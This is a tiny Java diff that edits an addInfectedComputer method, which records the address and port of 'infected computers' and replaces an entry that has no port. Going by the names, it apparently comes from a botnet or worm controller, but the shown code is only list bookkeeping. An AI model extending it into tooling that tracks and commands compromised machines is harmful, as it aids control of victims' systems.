@@ -19,7 +19,10 @@ public class Database {
 	}
 	
 	public static void addInfectedComputer(InetAddress addr,Integer port) {
+		if(infectedComputers.contains(new Pair<>(addr,null)))
+				infectedComputers.remove(new Pair<>(addr,null));
 		infectedComputers.add(new Pair<>(addr,port));
+		
 	}
 	
 	
